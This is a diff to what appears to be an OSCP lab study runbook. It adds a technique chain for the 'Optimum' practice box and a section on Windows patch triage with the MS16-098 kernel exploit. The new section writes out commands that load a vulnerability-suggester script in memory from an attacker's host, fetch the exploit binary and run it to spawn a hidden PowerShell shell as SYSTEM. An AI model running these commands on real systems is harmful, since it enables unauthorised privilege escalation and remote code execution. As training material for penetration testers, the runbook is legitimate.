@@ -60,6 +60,7 @@ Use variables from boxstart and boxset. Keep passwords, hashes, keys, cookies, a
 | [[OSCP/BOXES/WRITE UPS/Windows/Jerry\|Jerry]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T09 - Tomcat manager and WAR upload\|T09]] -> [[#T17 - File upload and webshell\|T17]] -> [[#T22 - Callback and shell stabilization\|T22]] |
 | [[OSCP/BOXES/WRITE UPS/Windows/Love\|Love]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T16 - SSRF to an internal service\|T16]] -> [[#T17 - File upload and webshell\|T17]] -> [[#T13 - Command injection\|T13]] -> [[#T31 - Windows services, tasks, AppLocker, and installer policy\|T31]] |
 | [[OSCP/BOXES/WRITE UPS/Windows/MarkUp\|MarkUp]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T15 - XXE file read\|T15]] -> [[#T23 - SSH credentials, keys, passphrases, and password reuse\|T23]] -> [[#T31 - Windows services, tasks, AppLocker, and installer policy\|T31]] |
+| [[OSCP/BOXES/WRITE UPS/Windows/Optimum\|Optimum]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T07 - Version-specific web exploit\|T07]] -> [[#T13 - Command injection\|T13]] -> [[#T22 - Callback and shell stabilization\|T22]] -> [[#T52 - Windows patch triage and MS16-098\|T52]] -> [[#T49 - Cleanup and closeout after a scenario branch\|T49]] |
 | [[OSCP/BOXES/WRITE UPS/Windows/Netmon\|Netmon]] | [[#T01 - Recon and service triage\|T01]] -> [[#T03 - Anonymous FTP and filesystem exposure\|T03]] -> [[#T18 - Source, configuration, backup, and log credential recovery\|T18]] -> [[#T11 - Management interface and default credential branch\|T11]] -> [[#T13 - Command injection\|T13]] -> [[#T31 - Windows services, tasks, AppLocker, and installer policy\|T31]] |
 | [[OSCP/BOXES/WRITE UPS/Windows/Servmon\|Servmon]] | [[#T01 - Recon and service triage\|T01]] -> [[#T03 - Anonymous FTP and filesystem exposure\|T03]] -> [[#T14 - LFI, RFI, and path traversal\|T14]] -> [[#T23 - SSH credentials, keys, passphrases, and password reuse\|T23]] -> [[#T28 - Local services, port forwarding, and tmux or VNC\|T28]] -> [[#T31 - Windows services, tasks, AppLocker, and installer policy\|T31]] |
 
@@ -1100,6 +1101,41 @@ id
 ### Open next
 
 Use [[OSCP/BOXES/WRITE UPS/Linux/Shocker|Shocker]], [[OSCP/RUNBOOK V2/Linux - Shellshock CGI|Linux Shellshock CGI]], and [[#T49 - Cleanup and closeout after a scenario branch|T49]].
+
+## T52 - Windows patch triage and MS16-098
+
+### Run this
+
+~~~powershell
+systeminfo
+IEX (New-Object Net.WebClient).DownloadString('http://$LocalIP:$TransferPort/Sherlock.ps1')
+Find-AllVulns
+~~~
+
+Stage the reviewed binary from Kali, then fetch it from the native Windows callback:
+
+~~~bash
+curl -fL https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS16-098/bfill.exe \
+  -o "$BoxDir/www/bfill.exe"
+~~~
+
+~~~powershell
+(New-Object Net.WebClient).DownloadFile('http://$LocalIP:$TransferPort/bfill.exe', 'C:\Users\Public\bfill.exe')
+C:\Users\Public\bfill.exe cmd.exe /c powershell.exe -NoP -NonI -W Hidden -Exec Bypass -File C:\Users\Public\system-shell.ps1
+whoami
+hostname
+~~~
+
+### What did you get?
+
+- [ ] `systeminfo` shows one processor and Sherlock suggests MS16-032 -> **Reject that implementation because its CPU check fails on a single-processor host. Compare another candidate against the exact OS, architecture, build, and patch state.**
+- [ ] MS16-098 matches the host and the binary is downloaded -> **Run it from the clean native callback with a fresh listener, not from the HFS worker context.**
+- [ ] `whoami` returns SYSTEM -> **Capture the identity and hostname privately, then open [[#T49 - Cleanup and closeout after a scenario branch|T49]].**
+- [ ] No callback -> **Check the transfer log, callback port, PowerShell script, listener, and execution context before changing exploit families.**
+
+### Open next
+
+Use [[OSCP/RUNBOOK V2/Windows - Privilege Triage|Windows Privilege Triage]], [[OSCP/COMMAND APPENDIX/Windows Privilege Escalation|Windows Privilege Escalation]], and [[OSCP/BOXES/WRITE UPS/Windows/Optimum|Optimum]].
 
 ## T49 - Cleanup and closeout after a scenario branch
 
